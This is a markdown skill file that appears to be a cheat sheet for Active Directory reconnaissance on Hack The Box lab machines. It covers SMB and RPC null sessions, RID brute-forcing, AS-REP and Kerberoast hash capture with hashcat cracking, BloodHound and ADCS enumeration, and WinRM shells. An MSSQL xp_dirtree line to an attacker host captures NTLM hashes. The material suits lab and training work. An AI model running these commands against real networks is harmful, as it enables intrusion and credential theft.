---
name: ad-recon
description: Initial recon for HTB AD machines based on 0xdf methodology across Forest, Cicada, Active, Rebound, Manager, Resolute, Authority, EscapeTwo, Retro.
---

# AD Initial Recon

## Port interpretation
```
53   → DNS (try zone transfer: dig axfr {DOMAIN} @{IP})
88   → Kerberos → confirms DC
135  → RPC
139/445 → SMB
389/636 → LDAP/LDAPS
3268/3269 → Global Catalog
5985/5986 → WinRM (shell if creds work)
80/443/8080/8443 → Web (often intended entry point)
1433 → MSSQL (xp_dirtree for Net-NTLMv2, xp_cmdshell if sa)
3389 → RDP
```

## 1. SMB enumeration
```bash
# null/anonymous
netexec smb {IP} -u '' -p ''
netexec smb {IP} -u '' -p '' --shares
netexec smb {IP} -u 'a' -p '' --shares          # some DCs need any username
smbclient -L //{IP} -N

# authenticated
netexec smb {IP} -u '{USER}' -p '{PASS}' --shares
netexec smb {IP} -u '{USER}' -p '{PASS}' -M spider_plus  # spider all shares

# user enumeration via RID cycling (works even without null session)
netexec smb {IP} -u '' -p '' --rid-brute
netexec smb {IP} -u 'a' -p '' --rid-brute
```
Look for: welcome notes with default passwords, SYSVOL (GPP), non-standard shares, scripts

## 2. LDAP enumeration
```bash
# anonymous
ldapsearch -x -H ldap://{IP} -b '' -s base namingContexts
ldapsearch -x -H ldap://{IP} -b 'DC=x,DC=x' '(objectClass=user)' description

# authenticated — dump everything
ldapdomaindump -u '{DOMAIN}\{USER}' -p '{PASS}' {IP} -o ldap_dump/
netexec ldap {IP} -u '{USER}' -p '{PASS}' --users
netexec ldap {IP} -u '{USER}' -p '{PASS}' --groups
netexec ldap {IP} -u '{USER}' -p '{PASS}' --password-not-required   # Pre-Win2000 accounts
```
**Always check descriptions** — passwords in descriptions is extremely common in HTB

## 3. RPC
```bash
rpcclient -U '' -N {IP} -c 'enumdomusers'
rpcclient -U '{USER}%{PASS}' {IP} -c 'enumdomusers'
rpcclient -U '{USER}%{PASS}' {IP} -c 'enumdomgroups'
rpcclient -U '{USER}%{PASS}' {IP} -c 'querydominfo'   # password policy
```

## 4. Kerberos
```bash
# AS-REP roast (no creds needed, just usernames)
netexec ldap {IP} -u '{USER}' -p '{PASS}' --asreproast asrep.txt
impacket-GetNPUsers {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Kerberoast (needs creds)
netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# User enumeration via Kerberos error codes
kerbrute userenum --dc {IP} -d {DOMAIN} /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

## 5. BloodHound collection
```bash
# rusthound-ce — mandatory for ADCS data
rusthound-ce -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {IP} --zip

# Python alternative
bloodhound-ce-python -c all -d {DOMAIN} -u '{USER}' -p '{PASS}' -ns {IP} --zip

# Kerberos-only (no NTLM)
bloodhound-ce-python -c all -d {DOMAIN} -u '{USER}' -p '{PASS}' -ns {IP} --zip -k
```

## 6. ADCS
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M adcs
certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -vulnerable -stdout
```

## 7. WinRM
```bash
netexec winrm {IP} -u '{USER}' -p '{PASS}'
evil-winrm -i {IP} -u '{USER}' -p '{PASS}'
```

## 8. MSSQL (if 1433 open)
```bash
netexec mssql {IP} -u '{USER}' -p '{PASS}'
impacket-mssqlclient {DOMAIN}/{USER}:'{PASS}'@{IP} -windows-auth
# Inside mssql:
# EXEC xp_dirtree '\\{ATTACKER_IP}\share'   → captures Net-NTLMv2
# EXEC xp_cmdshell 'whoami'                  → RCE if enabled/sa
```

## 9. Web (if HTTP/HTTPS open)
```bash
feroxbuster -u http://{IP} -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
ffuf -w subdomains.txt -u http://{IP} -H 'Host: FUZZ.{DOMAIN}' -fs {SIZE}
# Always check: /robots.txt, /.git/, source code, config files
```

## Clock skew fix (Kerberos requires <5min)
```bash
sudo ntpdate {IP}
sudo timedatectl set-ntp false
sudo date -s "$(date -d "$(ntpdate -q {IP} | tail -1 | awk '{print $1, $2}')")"
```

## HTB patterns (from 0xdf writeups)
- **Cicada/Resolute**: Credentials in SMB shares or welcome notes → password spray
- **Active**: GPP password in SYSVOL → decrypt with gpp-decrypt
- **Forest**: RPC null session → user list → AS-REP roast
- **Authority**: Open SMB share with Ansible playbooks → ansible-vault crack → creds
- **Retro**: Pre-Win2000 machine account (passwordnotreqd) → password = lowercase hostname
- **EscapeTwo**: MSSQL → broken Excel workbook → creds → xp_cmdshell
- **Manager**: RID cycling → username as password spray → MSSQL → filesystem → ADCS